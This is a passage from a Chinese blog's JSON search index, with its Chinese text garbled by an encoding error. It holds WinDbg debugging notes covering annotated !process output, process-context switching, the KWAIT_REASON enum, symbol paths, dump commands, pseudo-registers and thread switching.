point.","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"è°ƒè¯•","slug":"è°ƒè¯•","permalink":"https://hodlyounger.github.io/tags/%E8%B0%83%E8%AF%95/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘åˆ†æå®æˆ˜","date":"2024-08-31T01:41:20.251Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘åˆ†æå®æˆ˜/","text":"æ¦‚è¿°ï¼š windbg åˆ†æå®æˆ˜ï¼Œå‘½ä»¤è¾“å‡ºè§£æã€è‡ªå®šä¹‰è„šæœ¬ [toc] ã€è¾“å‡ºåˆ†æã€‘è°ƒè¯•è¿›ç¨‹ åŒæœºè°ƒè¯•ä¸‹ï¼Œè°ƒè¯•è¿›ç¨‹è¦ç”¨åˆ° !process å’Œ .process å‘½ä»¤ï¼Œè¿›å…¥è¿›ç¨‹ç©ºé—´åï¼Œå‘½ä»¤åŒç”¨æˆ·æ€è°ƒè¯• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071: kd&gt; !process fffffa800c5c8060 3PROCESS fffffa800c5c8060 SessionId: 0 Cid: 06fc Peb: 7fffffd4000 ParentCid: 025c DirBase: 1f8dfb000 ObjectTable: fffff8a0020a44e0 HandleCount: 281. Image: svchost.exe VadRoot fffffa800c5c8570 Vads 128 Clone 0 Private 2532. Modified 992. Locked 0. DeviceMap fffff8a001b400b0 Token fffff8a0020ac060 ElapsedTime 00:06:27.486 UserTime 00:00:00.046 KernelTime 00:00:00.093 QuotaPoolUsage[PagedPool] 94704 QuotaPoolUsage[NonPagedPool] 32760 Working Set Sizes (now,min,max) (4303, 50, 345) (17212KB, 200KB, 1380KB) PeakWorkingSetSize 4717 VirtualSize 57 Mb PeakVirtualSize 57 Mb PageFaultCount 6769 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 2766 THREAD fffffa800c5d0060 Cid 06fc.0700 Teb: 000007fffffde000 Win32Thread: fffff900c075cc10 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c3d96a0 SynchronizationEvent THREAD fffffa800c482060 Cid 06fc.0704 Teb: 000007fffffdc000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Alertable fffffa800c471060 SynchronizationTimer fffffa800c42d200 SynchronizationTimer fffffa800c467680 SynchronizationEvent fffffa800c48b440 SynchronizationEvent fffffa800c47f1f0 SynchronizationEvent fffffa800c534060 SynchronizationEvent fffffa800c556060 SynchronizationEvent fffffa800c5212f0 SynchronizationEvent fffffa800c5213f0 SynchronizationEvent fffffa800c41f5d0 SynchronizationTimer fffffa800c4595d0 SynchronizationTimer fffffa800c592240 SynchronizationEvent fffffa800c593b00 ProcessObject fffffa800c459550 SynchronizationEvent fffffa800c59b400 SynchronizationEvent fffffa800c3f6810 SynchronizationEvent fffffa800c5a1120 SynchronizationEvent fffffa800c5b5120 SynchronizationEvent fffffa800c482610 SynchronizationTimer fffffa800c466060 SynchronizationEvent fffffa800c59b060 SynchronizationEvent fffffa800c3ec2d0 SynchronizationEvent fffffa800c466240 SynchronizationEvent THREAD fffffa800c4ad370 Cid 06fc.0708 Teb: 000007fffffda000 Win32Thread: fffff900c07cac10 WAIT: (UserRequest) UserMode Non-Alertable fffffa800cbdf3e0 SynchronizationEvent THREAD fffffa800c4a2060 Cid 06fc.0714 Teb: 000007fffff9e000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c4a9110 NotificationEvent THREAD fffffa800c537370 Cid 06fc.0718 Teb: 000007fffff9c000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa80075eb840 NotificationEvent THREAD fffffa800c54c370 Cid 06fc.0724 Teb: 000007fffff9a000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c556140 NotificationEvent THREAD fffffa800c54a060 Cid 06fc.072c Teb: 000007fffffd6000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c5386b0 SynchronizationEvent fffffa800c521370 NotificationEvent fffffa800c521140 NotificationEvent fffffa800c54a5b0 NotificationEvent fffffa800c543760 NotificationEvent THREAD fffffa800c51e060 Cid 06fc.0734 Teb: 000007fffff96000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800b2f8600 SynchronizationEvent fffffa800c5341d0 SynchronizationEvent fffffa800c556620 SynchronizationEvent fffffa800c583780 SynchronizationEvent fffffa800c5ce280 SynchronizationEvent fffffa800cbcf660 SynchronizationEvent THREAD fffffa800c41e380 Cid 06fc.0754 Teb: 000007fffff94000 Win32Thread: 0000000000000000 WAIT: (WrLpcReply) UserMode Non-Alertable fffffa800c41e748 Semaphore Limit 0x1 THREAD fffffa800c41f060 Cid 06fc.075c Teb: 000007fffff90000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c5b53c0 QueueObject THREAD fffffa800c466300 Cid 06fc.0760 Teb: 000007fffff8e000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Alertable fffffa800c3ec060 SynchronizationEvent THREAD fffffa800c461060 Cid 06fc.0764 Teb: 000007fffff8c000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800c41f790 SynchronizationEvent fffffa800c41f810 NotificationEvent THREAD fffffa8007c92060 Cid 06fc.00a0 Teb: 000007fffffd8000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa800780e640 Cid 06fc.19f0 Teb: 000007fffff98000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa80078fe650 Cid 06fc.1010 Teb: 000007fffff92000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa8007ebdb50 Cid 06fc.12e4 Teb: 000007fffff8a000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable fffffa800d8a88c0 SynchronizationEvent THREAD fffffa8008228b50 Cid 06fc.0e3c Teb: 000007fffff88000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject THREAD fffffa8007800b50 Cid 06fc.0440 Teb: 000007fffff86000 Win32Thread: 0000000000000000 WAIT: (WrQueue) UserMode Alertable fffffa800c3d9500 QueueObject è¿™æ˜¯Windows Debuggerï¼ˆWinDbgï¼‰ä¸­!processå‘½ä»¤çš„è¾“å‡ºï¼Œæä¾›äº†å…³äºç‰¹å®šè¿›ç¨‹çš„ä¿¡æ¯ã€‚ ç¬¬ä¸€è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„IDï¼Œå³fffffa800c5c8060ã€‚ ç¬¬äºŒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„ä¼šè¯IDï¼Œå³0ã€‚ ç¬¬ä¸‰è¡Œæ˜¾ç¤ºäº†è°ƒç”¨è¿›ç¨‹çš„IDï¼Œå³025cã€‚ ç¬¬å››è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ï¼Œå³1f8dfb000ã€‚ ç¬¬äº”è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å¯¹è±¡è¡¨ï¼Œå³ffff8a0020a44e0ã€‚ ç¬¬å…­è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å¥æŸ„æ•°ï¼Œå³281ã€‚ ç¬¬ä¸ƒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å›¾åƒï¼Œå³svchost.exeã€‚ ç¬¬å…«è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€æ ¹ï¼Œå³ffffa800c5c8570ã€‚ ç¬¬ä¹è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹ä¸­çš„VADï¼ˆè™šæ‹Ÿåœ°å€ç›®å½•ï¼‰æ•°ï¼Œå³128ã€‚ ç¬¬åè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹æ˜¯å¦ä¸ºå…‹éš†è¿›ç¨‹ï¼Œå³0ã€‚ ç¬¬åä¸€è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹æ˜¯å¦ä¸ºç§æœ‰è¿›ç¨‹ï¼Œå³2532ã€‚ ç¬¬åäºŒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„ä¿®æ”¹è®¡æ•°ï¼Œå³992ã€‚ ç¬¬åä¸‰è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„é”å®šè®¡æ•°ï¼Œå³0ã€‚ ç¬¬åå››è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„è®¾å¤‡æ˜ å°„ï¼Œå³ffff8a001b400b0ã€‚ ç¬¬åäº”è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„ä»¤ç‰Œï¼Œå³ffff8a0020ac060ã€‚ ç¬¬åå…­è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„è¿è¡Œæ—¶é—´ï¼Œå³00:06:27.486ã€‚ ç¬¬åä¸ƒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„ç”¨æˆ·æ—¶é—´ï¼Œå³00:00:00.046ã€‚ ç¬¬åå…«è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å†…æ ¸æ—¶é—´ï¼Œå³00:00:00.093ã€‚ ç¬¬åä¹è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„é…é¢æ± ä½¿ç”¨æƒ…å†µï¼Œå³94704ç”¨äºé¡µé¢æ± å’Œ32760ç”¨äºéé¡µé¢æ± ã€‚ ç¬¬äºŒåè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å·¥ä½œé›†å¤§å°ï¼Œå³4303ç”¨äºç°åœ¨ã€50ç”¨äºæœ€å°å’Œ345ç”¨äºæœ€å¤§ã€‚ ç¬¬äºŒåä¸€è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å³°å€¼å·¥ä½œé›†å¤§å°ï¼Œå³4717ã€‚ ç¬¬äºŒåäºŒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„è™šæ‹Ÿå¤§å°ï¼Œå³57 MBã€‚ ç¬¬äºŒåä¸‰è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å³°å€¼è™šæ‹Ÿå¤§å°ï¼Œä¹Ÿæ˜¯57 MBã€‚ ç¬¬äºŒåå››è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„é¡µé¢æ•…éšœæ¬¡æ•°ï¼Œå³6769ã€‚ ç¬¬äºŒåäº”è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„å†…å­˜ä¼˜å…ˆçº§ï¼Œå³BACKGROUNDã€‚ ç¬¬äºŒåå…­è¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„åŸºæœ¬ä¼˜å…ˆçº§ï¼Œå³8ã€‚ ç¬¬äºŒåä¸ƒè¡Œæ˜¾ç¤ºäº†è¿›ç¨‹çš„æäº¤é‡ï¼Œå³2766ã€‚ æœ€åä¸€éƒ¨åˆ†è¾“å‡ºæ˜¾ç¤ºäº†è¿›ç¨‹çš„çº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç”¨ä¸€è¡Œè¡¨ç¤ºï¼ŒåŒ…æ‹¬çº¿ç¨‹IDã€Cidï¼ˆè¿æ¥IDï¼‰ã€Tebï¼ˆçº¿ç¨‹ç¯å¢ƒå—ï¼‰å’Œç­‰å¾…ç±»å‹å’Œç­‰å¾…çš„å¯¹è±¡ã€‚ æŸ¥çœ‹æŸä¸ªè¿›ç¨‹ 1234# æŸ¥çœ‹æŸä¸ªè¿›ç¨‹!process 0 0 ç›®æ ‡è¿›ç¨‹å è·å–ç›®æ ‡è¿›ç¨‹EPROCESSåŸºæœ¬ä¿¡æ¯# ä¾‹å¦‚æŸ¥çœ‹ svchost.exe!process 0 0 svchost.exe .process /p +EPROCESSä¿¡æ¯ åˆ‡æ¢åˆ°ç›®æ ‡è¿›ç¨‹ç©ºé—´ 1.process /p è¿›ç¨‹åœ°å€ .reload /f /user å¼ºåˆ¶é‡æ–°åŠ è½½ç”¨æˆ·æ€ç¬¦å· 1.reload /f /user .process /i /p ç›®æ ‡è¿›ç¨‹çš„EPROCESS ä¾µå…¥å¼è°ƒè¯• 1.process /i /p è¿›ç¨‹åœ°å€ bp ç›®æ ‡API æ‰§è¡Œä¸‹æ–­ç‚¹å‘½ä»¤ ã€è„šæœ¬ã€‘éå†å¤§å°å›ºå®šçš„ç»“æ„ä½“ å¦‚ä¸‹æ‰€ç¤º 00007ffdf4044028 åœ°å€å­˜æ”¾çš„æ˜¯ä¸€ä¸ª _UNICODE_STRING* çš„æŒ‡é’ˆï¼Œ _UNICODE_STRING çš„å¤§å°ä¸º 0x10ã€‚ 12345.for (r $t0=0;@$t0&lt;3;r $t0=@$t0+1)&#123; r $t1=$t0*0x10; dS 00007ffd`f4044028+$t1 &#125; # å¦‚æœä¸çŸ¥é“ç»“æ„ä½“å¤§å°æ˜¯å¤šå°‘ï¼Œå¯ä»¥ä½¿ç”¨??å‘½ä»¤è®¡ç®—&gt; ??sizeof(nt!_UNICODE_STRING) unsigned int64 0x10 è¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼Œæ‰“å°äº†ä¸‰ä¸ªå­—ç¬¦ä¸²ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘windbgå†…æ ¸è°ƒè¯•","date":"2024-08-31T01:41:20.250Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘windbgå†…æ ¸è°ƒè¯•/","text":"æ¦‚è¿°ï¼šwindbg å†…æ ¸è°ƒè¯•çš„ä¸€äº›è®°å½• å‚è€ƒï¼šWinDbg (å†…æ ¸æ¨¡å¼) å…¥é—¨ - Windows drivers | Microsoft Learn å‘½ä»¤æ•´ç†-è¾…åŠ©ç±» 1eb ntdll!ShowSnaps 1 çº¿ç¨‹ç­‰å¾…åŸå›  12345678910111213141516171819202122232425262728293031enum KWAIT_REASON&#123; Executive, FreePage, PageIn, PoolAllocation, DelayExecution, Suspended, UserRequest, WrExecutive, WrFreePage, WrPageIn, WrPoolAllocation, WrDelayExecution, WrSuspended, WrUserRequest, WrEventPair, WrQueue, WrLpcReceive, WrLpcReply, WrVirtualMemory, WrPageOut, WrRendezvous, Spare2, Spare3, Spare4, Spare5, Spare6, WrKernel, MaximumWaitReason&#125;; KWAIT_REASONæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œå®šä¹‰åœ¨Windowså†…æ ¸ä¸­ï¼Œç”¨äºè¡¨ç¤ºè¿›ç¨‹æˆ–çº¿ç¨‹ç­‰å¾…çš„åŸå› ã€‚ä»¥ä¸‹æ˜¯æ¯ä¸ªæšä¸¾å€¼çš„å«ä¹‰ï¼š Executive: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…æ‰§è¡Œã€‚ FreePage: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…ç©ºé—²é¡µã€‚ PageIn: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…é¡µé¢è¢«è½½å…¥å†…å­˜ã€‚ PoolAllocation: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…èµ„æºæ± çš„åˆ†é…ã€‚ DelayExecution: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…ä»¥æ‰§è¡Œå»¶è¿Ÿæ“ä½œã€‚ Suspended: è¿›ç¨‹æˆ–çº¿ç¨‹è¢«æŒ‚èµ·ï¼Œæ— æ³•æ‰§è¡Œæ“ä½œã€‚ UserRequest: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚ã€‚ WrExecutive: ä¸Executiveç›¸åŒã€‚ WrFreePage: ä¸FreePageç›¸åŒã€‚ WrPageIn: ä¸PageInç›¸åŒã€‚ WrPoolAllocation: ä¸PoolAllocationç›¸åŒã€‚ WrDelayExecution: ä¸DelayExecutionç›¸åŒã€‚ WrSuspended: ä¸Suspendedç›¸åŒã€‚ WrUserRequest: ä¸UserRequestç›¸åŒã€‚ WrEventPair: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…äº‹ä»¶å¯¹çš„è§¦å‘ã€‚ WrQueue: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…é˜Ÿåˆ—çš„å¤„ç†ã€‚ WrLpcReceive: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…æ¥æ”¶LPCï¼ˆæœ¬åœ°è¿‡ç¨‹è°ƒç”¨ï¼‰æ¶ˆæ¯ã€‚ WrLpcReply: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…å›å¤LPCï¼ˆæœ¬åœ°è¿‡ç¨‹è°ƒç”¨ï¼‰æ¶ˆæ¯ã€‚ WrVirtualMemory: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…è™šæ‹Ÿå†…å­˜çš„æ“ä½œã€‚ WrPageOut: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…é¡µé¢è¢«å†™å‡ºã€‚ Rendezvous: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾… rendezvousï¼ˆæ±‡èšï¼‰æ“ä½œã€‚ Spare2: ä¿ç•™ï¼Œæœªä½¿ç”¨ã€‚ Spare3: ä¿ç•™ï¼Œæœªä½¿ç”¨ã€‚ Spare4: ä¿ç•™ï¼Œæœªä½¿ç”¨ã€‚ Spare5: ä¿ç•™ï¼Œæœªä½¿ç”¨ã€‚ Spare6: ä¿ç•™ï¼Œæœªä½¿ç”¨ã€‚ WrKernel: è¿›ç¨‹æˆ–çº¿ç¨‹æ­£åœ¨ç­‰å¾…å†…æ ¸æ“ä½œã€‚ MaximumWaitReason: æšä¸¾çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œç”¨äºæŒ‡ç¤ºå·²è¾¾åˆ°æœ€å¤§ç­‰å¾…åŸå› æ•°é‡ã€‚ è¿™äº›æšä¸¾å€¼ç”¨äºWindowsæ“ä½œç³»ç»Ÿçš„è¿›ç¨‹å’Œçº¿ç¨‹è°ƒåº¦ï¼Œä»¥åŠåœ¨å´©æºƒæ—¶ç”Ÿæˆdumpæ–‡ä»¶ä»¥è¿›è¡Œé—®é¢˜æ’æŸ¥å’Œä¿®å¤ã€‚","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘windbg éšæ‰‹è®°","date":"2024-08-31T01:41:20.247Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘Windbgéšæ‰‹è®°/","text":"ç›¸å…³å·¥å…·æ•´ç†ï¼š API Monitor PCHunterå·¥å…· windbg è„šæœ¬ åˆ†æ32ä½ 1.load wow64exts è®¾ç½®PDBæ–‡ä»¶è·¯å¾„ 1srv*D:\\Symbols*https://msdl.microsoft.com/download/symbols ç”Ÿæˆdump 1.dump /ma C:\\dumps\\myapp.dmp è°ƒè¯•æŠ€å·§ ç›´æ¥æŒ‰å›è½¦å¯ä»¥æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤ ä½¿ç”¨åˆ†åˆ†å·ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå¯ä»¥åœ¨åŒä¸€è¡Œè¾“å…¥å¤šæ¡å‘½ä»¤ æŒ‰ä¸Šä¸‹æ–¹å‘é”®å¯ä»¥æµè§ˆå’Œé€‰æ‹©ä»¥å‰è¾“å…¥è¿‡çš„å‘½ä»¤ å½“å‘½ä»¤æç¤ºç¬¦æ˜¾ç¤ºä¸ºBUSYæ—¶ï¼Œå³ä½¿å‘½ä»¤ç¼–è¾‘æ¡†å¯ä»¥è¾“å…¥å‘½ä»¤ï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤ä¹Ÿä¸ä¼šè¢«é©¬ä¸Šæ‰§è¡Œï¼Œè¦ç­‰WinDBGæ¢å¤åˆ°ç©ºé—²çŠ¶æ€æ‰èƒ½æ‰§è¡Œ ä½¿ç”¨Ctrl+Break æ¥ç»ˆæ­¢ä¸€ä¸ªé•¿æ—¶é—´æœªå®Œæˆçš„å‘½ä»¤ã€‚å¦‚æœä½¿ç”¨KDæˆ–åˆ™CDBï¼Œé‚£ä¹ˆç”¨Ctrl+C é€‰æ‹©èœå•-&gt;Edit_&gt;Write Window Text to Fileå¯ä»¥æŠŠä¹‹å‰æ•²è¿‡çš„æ‰€æœ‰å‘½ä»¤è®°å½•åˆ°æ–‡ä»¶ ä¼ªå¯„å­˜å™¨ WinDBGè‡ªåŠ¨å®šä¹‰äº†å¾ˆå¤šä¼ªå¯„å­˜å™¨ã€‚åœ¨å‘½ä»¤è¡Œå’Œå‘½ä»¤æ–‡ä»¶ä¸­éƒ½å¯ä»¥ä½¿ç”¨ä¼ªå¯„å­˜å™¨ã€‚WinDBGä¼šè‡ªåŠ¨å°†å…¶æ›¿æ¢ï¼ˆå±•å¼€ï¼‰ä¸ºåˆé€‚çš„å€¼ã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ª@$scopeipå°±æ˜¯ä¸€ä¸ªä¼ªå¯„å­˜å™¨ï¼Œå®ƒä»£è¡¨å½“å‰çš„eipæŒ‡é’ˆã€‚ ä¸‹è¡¨åˆ—å‡ºäº†windbgæ‰€å®šä¹‰çš„éƒ¨åˆ†å¯„å­˜å™¨(å­—å…¸å‹çŸ¥è¯†ï¼Œéœ€è¦æ—¶æŸ¥é˜…å³å¯) ä¼ªå¯„å­˜å™¨ å«ä¹‰ $ea è°ƒè¯•ç›®æ ‡æ‰€æ‰§è¡Œä¸Šä¸€æ¡æŒ‡ä»¤çš„æœ‰æ•ˆåœ°å€ $ea2 è°ƒè¯•ç›®æ ‡æ‰€æ‰§è¡Œä¸Šä¸€æ¡æŒ‡ä»¤çš„ç¬¬äºŒä¸ªæœ‰æ•ˆåœ°å€ $exp è¡¨è¾¾å¼è¯„ä¼°å™¨æ‰€è¯„ä¼°çš„ä¸Šä¸€æ¡è¡¨è¾¾å¼ $ra å½“å‰å †æ ˆçš„è¿”å›åœ°å€ã€‚è¿™ä¸ªåœ¨æ‰§è¡Œå‘½ä»¤ä¸­ç‰¹åˆ«æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œg @$ra å°†ä¸€ç›´æ‰§è¡Œåˆ°è¿”å›åœ°å€å¤„ï¼ˆè™½ç„¶ï¼Œå¯¹äºâ€œæ­¥å‡º(stepping out)â€å½“å‰å‡½æ•°gu (Go Up)æ˜¯ä¸€ä¸ªæ›´åŠ å‡†å¤‡æœ‰æ•ˆçš„æ–¹æ³•ï¼‰ã€‚ $ip æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼š x86 å¤„ç†å™¨ï¼šå’Œ eip ç›¸åŒ Itanium å¤„ç†å™¨ï¼šæ¶‰åŠ iipï¼ˆè¯·çœ‹è¡¨åçš„æ³¨è§£ï¼‰ x64å¤„ç†å™¨ï¼šå’Œripç›¸åŒ $eip æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ $eventip å½“å‰è°ƒè¯•äº‹ä»¶å‘ç”Ÿæ—¶çš„æŒ‡ä»¤æŒ‡é’ˆ $previp ä¸Šä¸€äº‹ä»¶çš„æŒ‡ä»¤æŒ‡é’ˆ $relip ä¸å½“å‰äº‹ä»¶å…³è”çš„æŒ‡ä»¤æŒ‡é’ˆ $scopeip å½“å‰ä¸Šä¸‹æ–‡çš„æŒ‡ä»¤æŒ‡é’ˆ $exentry å½“å‰è¿›ç¨‹çš„å…¥å£åœ°å€ $retreg é¦–è¦çš„å‡½æ•°è¿”å›å€¼å¯„å­˜å™¨ $retreg64 64ä½æ ¼å¼çš„é¦–è¦å‡½æ•°è¿”å›å¯„å­˜å™¨ $csp æ ˆé¡¶æŒ‡é’ˆESP $p ä¸Šä¸€ä¸ªå†…å­˜æ˜¾ç¤ºå‘½ä»¤æ‰€æ‰“å°çš„ç¬¬ä¸€ä¸ªå€¼ $proc å½“å‰è¿›ç¨‹EPROCESSç»“æ„çš„æŒ‡é’ˆ $thread å½“å‰çº¿ç¨‹ETHREADç»“æ„çš„æŒ‡é’ˆ $peb å½“å‰è¿›ç¨‹çš„è¿›ç¨‹ç¯å¢ƒå—(PEB)çš„åœ°å€ $teb å½“å‰çº¿ç¨‹çš„çº¿ç¨‹ç¯å¢ƒå—(TEB)åœ°å€ $tpid æ‹¥æœ‰å½“å‰çº¿ç¨‹çš„è¿›ç¨‹ID(PID) $tid å½“å‰çº¿ç¨‹çš„çº¿ç¨‹ID $bpx Xå·æ–­ç‚¹çš„åœ°å€ $frame å½“å‰æ ˆå¸§çš„åºå· $dbgtime å½“å‰æ—¶é—´ $callret ä½¿ç”¨.callå‘½ä»¤è°ƒç”¨çš„ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ $ptrsize è°ƒè¯•ç›®æ ‡æ‰€åœ¨ç³»ç»Ÿçš„æŒ‡é’ˆç±»å‹å®½åº¦ $pagesize è°ƒè¯•ç›®æ ‡æ‰€åœ¨çš„ç³»ç»Ÿçš„å†…å­˜é¡µå­—èŠ‚æ•° å‘½ä»¤æ•´ç† ? 0n å‘½ä»¤ Windbgä¸­çš„ ?0n æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨æ¥è®¾ç½®è¡¨è¾¾å¼çš„æ•°åˆ¶ä¸ºåè¿›åˆ¶ã€‚å…·ä½“æ¥è¯´ï¼Œå½“ä½ éœ€è¦æŸ¥çœ‹ä¸€ä¸ªå†…å­˜åœ°å€æˆ–è€…å˜é‡ä»¥åè¿›åˆ¶æ ¼å¼æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ ?0n å‘½ä»¤ã€‚ åœ¨Windbgä¸­ï¼Œæ•°åˆ¶çš„è¡¨ç¤ºï¼š 0xè¡¨ç¤ºåå…­è¿›åˆ¶ 0nè¡¨ç¤ºåè¿›åˆ¶ 0tè¡¨ç¤ºå…«è¿›åˆ¶ 0yè¡¨ç¤ºäºŒè¿›åˆ¶ã€‚ Windbgé»˜è®¤æ•°åˆ¶ä¸ºåå…­è¿›åˆ¶ã€‚ åˆ‡æ¢çº¿ç¨‹ åœ¨WinDbgä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ‡æ¢çº¿ç¨‹ï¼š ~ å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢å½“å‰æ´»åŠ¨çº¿ç¨‹ã€‚ä¾‹å¦‚ï¼Œ~0så°†åˆ‡æ¢åˆ°çº¿ç¨‹IDä¸º0çš„çº¿ç¨‹ã€‚ ~* å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢åˆ°æ‰€æœ‰çº¿ç¨‹ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹ã€‚ ~[] å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢åˆ°ç‰¹å®šç´¢å¼•çš„çº¿ç¨‹ã€‚ä¾‹å¦‚ï¼Œ~[3]så°†åˆ‡æ¢åˆ°ç´¢å¼•ä¸º3çš„çº¿ç¨‹ã€‚ è¯·æ³¨æ„ï¼Œä½¿ç”¨è¿™äº›å‘½ä»¤æ—¶ï¼Œè¦ç¡®ä¿å·²ç»åœ¨è°ƒè¯•ä¼šè¯ä¸­åŠ è½½äº†é€‚å½“çš„ç¬¦å·å’Œæºä»£ç ï¼Œå¹¶ä¸”å·²ç»æ‰“å¼€äº†éœ€è¦è°ƒè¯•çš„è¿›ç¨‹å’Œçº¿ç¨‹ã€‚ 